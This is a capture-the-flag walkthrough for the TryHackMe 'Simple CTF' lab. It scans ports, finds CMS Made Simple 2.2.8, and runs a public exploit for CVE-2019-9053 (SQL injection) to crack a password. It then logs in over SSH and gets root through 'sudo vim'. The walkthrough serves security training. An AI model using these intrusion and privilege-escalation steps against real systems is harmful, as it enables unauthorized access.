# [Simple CTF](https://tryhackme.com/room/easyctf)

## Deploy the machine and attempt the questions!

### How many services are running under port 1000?

### What is running on the higher port?

1. Running an nmap scan revealed two services running under port 1000. The scan also showed that SSH is running on a higher port

```Bash
nmap -sV <IP>
```

[SCREEN01]

### What's the CVE you're using against the application?

### To what kind of vulnerability is the application vulnerable?

1. Scanning with gobuster reveals the `/simple` endpoint, at the bottom of which we find `CMS Made Simple version 2.2.8`. A quick google search reveals CVE-2019-9053 exploit - SQL (sqli) Injection

```
gobuster dir -u http://<IP>:80 -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x js,txt,html,php
```

[SCREEN02]

[SCREEN03]

### What's the password?

1. Let's use the python script from [exploit-db](https://www.exploit-db.com/exploits/46635)

```Bash
python 46635.py -u http://<IP>:80/simple --crack -w /root/Desktop/Tools/wordlists/rockyou.txt
```

[SCREEN04]

### Where can you login with the details obtained

1. Looking back at the nmap results we can assume it is ssh

```Bash
ssh mitch@<IP>
python -c 'import pty; pty.spawn("/bin/bash")'
```

### What's the user flag?

1. The flag is right there in our starting directory

```Bash
cat user.txt
```

[SCREEN05]

### Is there any other user in the home directory? What's its name?

1. Check the `/home` directory

```Bash
ls /home
```

[SCREEN06]

### What can you leverage to spawn a privileged shell?

1. Let's check what commands we can run with sudo privileges

```Bash
sudo -l
```

[SCREEN07]

### What's the root flag?

1. Check [GTFOBins](https://gtfobins.github.io/gtfobins/vim/) for vim, and use the first command with sudo

```Bash
sudo vim -c ':!/bin/sh'
cat root/root.txt
```

[SCREEN08]
